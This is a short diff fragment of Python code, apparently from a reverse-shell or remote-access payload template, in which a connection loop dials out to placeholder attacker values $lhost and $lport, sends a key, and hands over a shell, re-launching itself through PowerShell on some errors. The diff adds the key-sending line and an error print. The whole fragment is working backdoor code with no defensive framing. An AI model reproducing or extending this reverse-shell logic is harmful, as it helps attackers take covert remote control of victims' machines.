@@ -611,12 +611,14 @@ def connection():
         time.sleep(5)
         try:
             s.connect(('$lhost',$lport))
+            s.send('$key'.encode())
             shell()
             s.close()
             break
         except Exception as e:
             if e.errno != 10061:
                 subprocess.Popen('powershell -c '+sys.executable,shell=True)
+                print(e)
                 sys.exit()
             else:
                 continue
